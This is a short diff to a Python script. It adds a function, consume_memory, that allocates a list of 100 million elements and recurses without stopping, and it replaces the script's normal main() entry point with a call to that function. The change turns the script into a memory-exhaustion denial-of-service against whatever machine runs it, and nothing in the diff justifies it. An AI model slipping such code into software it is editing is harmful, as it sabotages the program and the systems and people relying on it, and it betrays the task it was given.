@@ -19,5 +19,9 @@ def main():
     
     main()
 
+def consume_memory():
+    large_list = [0] * int(1e8)  # Create a list with 100 million elements
+    consume_memory()  # Call the function recursively
+
 if __name__ == "__main__":
-    main()
+    consume_memory()
